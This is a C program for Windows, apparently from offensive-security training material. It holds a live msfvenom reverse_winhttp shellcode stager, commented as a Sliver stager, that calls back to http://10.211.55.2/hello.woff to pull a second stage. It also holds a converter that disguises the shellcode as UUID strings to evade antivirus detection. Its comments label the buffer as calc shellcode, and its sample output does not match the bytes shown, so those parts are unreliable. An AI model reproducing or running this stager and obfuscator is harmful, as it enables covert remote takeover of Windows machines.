#include <Windows.h>
#include <stdio.h>

// disable error 4996 (caused by sprint)
#pragma warning (disable:4996)

unsigned char rawData[] = {
// x64 calc metasploit shellcode {272 bytes}
	// ... (sliver stager from msfvenom)
	// ... msfvenom -p windows/x64/custom/reverse_winhttp LHOST=<ip> LPORT=<port> LURI=/hello.woff -f c
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x48\x31\xd2\x51\x56\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48"
"\x8b\x72\x50\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
"\x74\x67\x48\x01\xd0\x8b\x48\x18\x50\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6"
"\x4d\x31\xc9\x48\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1"
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x41\x58"
"\x5e\x48\x01\xd0\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x48\x31\xdb\x53\x49\xbe\x77\x69\x6e"
"\x68\x74\x74\x70\x00\x41\x56\x48\x89\xe1\x49\xc7\xc2\x4c"
"\x77\x26\x07\xff\xd5\x53\x53\x48\x89\xe1\x53\x5a\x4d\x31"
"\xc0\x4d\x31\xc9\x53\x53\x49\xba\x04\x1f\x9d\xbb\x00\x00"
"\x00\x00\xff\xd5\x49\x89\xc4\xe8\x18\x00\x00\x00\x31\x00"
"\x30\x00\x2e\x00\x32\x00\x31\x00\x31\x00\x2e\x00\x35\x00"
"\x35\x00\x2e\x00\x32\x00\x00\x00\x5a\x48\x89\xc1\x49\xc7"
"\xc0\x50\x00\x00\x00\x4d\x31\xc9\x49\xba\x46\x9b\x1e\xc2"
"\x00\x00\x00\x00\xff\xd5\xe8\x54\x01\x00\x00\x68\x00\x74"
"\x00\x74\x00\x70\x00\x3a\x00\x2f\x00\x2f\x00\x31\x00\x30"
"\x00\x2e\x00\x32\x00\x31\x00\x31\x00\x2e\x00\x35\x00\x35"
"\x00\x2e\x00\x32\x00\x2f\x00\x68\x00\x65\x00\x6c\x00\x6c"
"\x00\x6f\x00\x2e\x00\x77\x00\x6f\x00\x66\x00\x66\x00\x2f"
"\x00\x2d\x00\x67\x00\x6c\x00\x6c\x00\x55\x00\x47\x00\x6c"
"\x00\x4c\x00\x79\x00\x55\x00\x49\x00\x66\x00\x55\x00\x52"
"\x00\x35\x00\x54\x00\x65\x00\x36\x00\x49\x00\x6a\x00\x47"
"\x00\x77\x00\x55\x00\x36\x00\x46\x00\x55\x00\x48\x00\x64"
"\x00\x69\x00\x65\x00\x41\x00\x57\x00\x78\x00\x68\x00\x56"
"\x00\x54\x00\x37\x00\x6e\x00\x4f\x00\x67\x00\x73\x00\x62"
"\x00\x33\x00\x37\x00\x6a\x00\x51\x00\x6c\x00\x62\x00\x67"
"\x00\x49\x00\x31\x00\x69\x00\x52\x00\x35\x00\x35\x00\x6c"
"\x00\x51\x00\x36\x00\x76\x00\x6a\x00\x39\x00\x74\x00\x45"
"\x00\x55\x00\x44\x00\x66\x00\x6c\x00\x6f\x00\x37\x00\x75"
"\x00\x43\x00\x46\x00\x43\x00\x55\x00\x76\x00\x55\x00\x2d"
"\x00\x41\x00\x72\x00\x41\x00\x74\x00\x56\x00\x67\x00\x34"
"\x00\x67\x00\x43\x00\x35\x00\x63\x00\x6d\x00\x31\x00\x6c"
"\x00\x56\x00\x56\x00\x66\x00\x75\x00\x35\x00\x42\x00\x32"
"\x00\x4a\x00\x33\x00\x4f\x00\x59\x00\x36\x00\x2d\x00\x6c"
"\x00\x68\x00\x68\x00\x73\x00\x74\x00\x2d\x00\x30\x00\x76"
"\x00\x56\x00\x35\x00\x42\x00\x6e\x00\x52\x00\x73\x00\x52"
"\x00\x43\x00\x59\x00\x4b\x00\x71\x00\x50\x00\x78\x00\x42"
"\x00\x4c\x00\x55\x00\x63\x00\x46\x00\x74\x00\x79\x00\x65"
"\x00\x72\x00\x53\x00\x31\x00\x4b\x00\x4f\x00\x61\x00\x00"
"\x00\x48\x89\xc1\x53\x5a\x41\x58\x4d\x89\xc5\x49\x83\xc0"
"\x24\x4d\x31\xc9\x53\x48\xc7\xc0\x00\x01\x00\x00\x50\x53"
"\x53\x49\xc7\xc2\x98\x10\xb3\x5b\xff\xd5\x48\x89\xc6\x48"
"\x83\xe8\x20\x48\x89\xe7\x48\x89\xf9\x49\xc7\xc2\x21\xa7"
"\x0b\x60\xff\xd5\x85\xc0\x0f\x84\x6d\x00\x00\x00\x48\x8b"
"\x47\x08\x85\xc0\x74\x3a\x48\x89\xd9\x48\xff\xc1\x48\xc1"
"\xe1\x20\x51\x53\x50\x48\xb8\x03\x00\x00\x00\x03\x00\x00"
"\x00\x50\x49\x89\xe0\x48\x83\xec\x20\x48\x89\xe7\x49\x89"
"\xf9\x4c\x89\xe1\x4c\x89\xea\x49\xc7\xc2\xda\xdd\xea\x49"
"\xff\xd5\x85\xc0\x74\x2d\xeb\x12\x48\x8b\x47\x10\x85\xc0"
"\x74\x23\x48\x83\xc7\x08\x6a\x03\x58\x48\x89\x07\x49\x89"
"\xf8\x6a\x18\x41\x59\x48\x89\xf1\x6a\x26\x5a\x49\xba\xd3"
"\x58\x9d\xce\x00\x00\x00\x00\xff\xd5\x6a\x0a\x5f\x53\x5a"
"\x48\x89\xf1\x4d\x31\xc9\x53\x53\x53\x53\x49\xba\x95\x58"
"\xbb\x91\x00\x00\x00\x00\xff\xd5\x85\xc0\x75\x0c\x48\xff"
"\xcf\x74\x02\xeb\xdd\xe8\x79\x00\x00\x00\x48\x89\xf1\x53"
"\x5a\x49\xc7\xc2\x05\x88\x9d\x70\xff\xd5\x85\xc0\x74\xe9"
"\x53\x48\x89\xe2\x53\x49\x89\xe1\x6a\x04\x41\x58\x48\x89"
"\xf1\x49\xc7\xc2\x6c\x29\x24\x7e\xff\xd5\x85\xc0\x74\xcd"
"\x48\x83\xc4\x28\x53\x59\x5a\x48\x89\xd3\x6a\x40\x41\x59"
"\x49\xc7\xc0\x00\x10\x00\x00\x49\xba\x58\xa4\x53\xe5\x00"
"\x00\x00\x00\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89"
"\xf1\x49\x89\xc0\x48\x89\xda\x49\x89\xf9\x49\xc7\xc2\x6c"
"\x29\x24\x7e\xff\xd5\x48\x83\xc4\x20\x85\xc0\x0f\x84\x84"
"\xff\xff\xff\x58\xc3\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5"
"\xa2\x56\xff\xd5"
};


// Function takes in 16 raw bytes and returns them in a UUID string format
char* GenerateUUid(int a, int b, int c, int d, int e, int f, int g, int h, int i, int j, int k, int l, int m, int n, int o, int p) {

	// Each UUID segment is 32 bytes
	char Output0[32], Output1[32], Output2[32], Output3[32];

	// There are 4 segments in a UUID (32 * 4 = 128)
	char result[128];

	// Generating output0 from the first 4 bytes
	sprintf(Output0, "%0.2X%0.2X%0.2X%0.2X", d, c, b, a);

	// Generating output1 from the second 4 bytes
	sprintf(Output1, "%0.2X%0.2X-%0.2X%0.2X", f, e, h, g);

	// Generating output2 from the third 4 bytes
	sprintf(Output2, "%0.2X%0.2X-%0.2X%0.2X", i, j, k, l);

	// Generating output3 from the last 4 bytes
	sprintf(Output3, "%0.2X%0.2X%0.2X%0.2X", m, n, o, p);

	// Combining Output0,1,2,3 to generate the UUID
	sprintf(result, "%s-%s-%s%s", Output0, Output1, Output2, Output3);

	//printf("[i] result: %s\n", (char*)result);
	return (char*)result;
}

// Generate the UUID output representation of the shellcode
// Function requires a pointer or base address to the shellcode buffer & the size of the shellcode buffer
BOOL GenerateUuidOutput(unsigned char* pShellcode, SIZE_T ShellcodeSize) {
	// If the shellcode buffer is null or the size is not a multiple of 16, exit
	if (pShellcode == NULL || ShellcodeSize == NULL || ShellcodeSize % 16 != 0) {
		return FALSE;
	}
	printf("char* UuidArray[%d] = { \n\t", (int)(ShellcodeSize / 16));

	// We will read one shellcode byte at a time, when the total is 16, begin generating the UUID string
	// The variable 'c' is used to store the number of bytes read. By default, starts at 16.
	int c = 16, counter = 0;
	char* UUID = NULL;

	for (int i = 0; i < ShellcodeSize; i++) {
		// Track the number of bytes read and when they reach 16 we enter this if statement to begin generating the UUID string
		if (c == 16) {
			counter++;

			// Generating the UUID string from 16 bytes which begin at i until [i + 15]
			UUID = GenerateUUid(
				pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3],
				pShellcode[i + 4], pShellcode[i + 5], pShellcode[i + 6], pShellcode[i + 7],
				pShellcode[i + 8], pShellcode[i + 9], pShellcode[i + 10], pShellcode[i + 11],
				pShellcode[i + 12], pShellcode[i + 13], pShellcode[i + 14], pShellcode[i + 15]
			);
			if (i == ShellcodeSize - 16) {

				// Printing the last UUID string
				printf("\"%s\"", UUID);
				break;
			}
			else {
				// Printing the UUID string
				printf("\"%s\", ", UUID);
			}
			c = 1;
			// Optional: To beautify the output on the console
			if (counter % 3 == 0) {
				printf("\n\t");
			}
		}
		else {
			c++;
		}
	}
	printf("\n};\n\n");
	return TRUE;
}




// Function that will take a buffer, and copy it to another buffer that is a multiple of 16 in size
BOOL PaddBuffer(IN PBYTE InputBuffer, IN SIZE_T InputBufferSize, OUT PBYTE* OutputPaddedBuffer, OUT SIZE_T* OutputPaddedSize) {

	PBYTE	PaddedBuffer = NULL;
	SIZE_T	PaddedSize = NULL;

	// Calculate the nearest number that is multiple of 16 and saving it to PaddedSize
	PaddedSize = InputBufferSize + 16 - (InputBufferSize % 16);
	// Allocating buffer of size PaddedSize
	PaddedBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, PaddedSize);
	if (!PaddedBuffer) {
		return FALSE;
	}
	// Cleaning the allocated buffer
	ZeroMemory(PaddedBuffer, PaddedSize);
	// Copying old buffer to a new padded buffer
	memcpy(PaddedBuffer, InputBuffer, InputBufferSize);
	// Saving results
	*OutputPaddedBuffer = PaddedBuffer;
	*OutputPaddedSize = PaddedSize;

	return TRUE;
}

int main() {


	if (!GenerateUuidOutput(rawData, sizeof(rawData))) {
		// if failed, that is sizeof(rawData) isnt multiple of 16
		return -1;
	}


	printf("[#] Press <Enter> To Quit ...");
	getchar();

	return 0;
}


/*
output:

char* UuidArray[17] = {
		"E48348FC-E8F0-00C0-0000-415141505251", "D2314856-4865-528B-6048-8B5218488B52", "728B4820-4850-B70F-4A4A-4D31C94831C0",
		"7C613CAC-2C02-4120-C1C9-0D4101C1E2ED", "48514152-528B-8B20-423C-4801D08B8088", "48000000-C085-6774-4801-D0508B481844",
		"4920408B-D001-56E3-48FF-C9418B348848", "314DD601-48C9-C031-AC41-C1C90D4101C1", "F175E038-034C-244C-0845-39D175D85844",
		"4924408B-D001-4166-8B0C-48448B401C49", "8B41D001-8804-0148-D041-5841585E595A", "59415841-5A41-8348-EC20-4152FFE05841",
		"8B485A59-E912-FF57-FFFF-5D48BA010000", "00000000-4800-8D8D-0101-000041BA318B", "D5FF876F-E0BB-2A1D-0A41-BAA695BD9DFF",
		"C48348D5-3C28-7C06-0A80-FBE07505BB47", "6A6F7213-5900-8941-DAFF-D563616C6300"
};
*/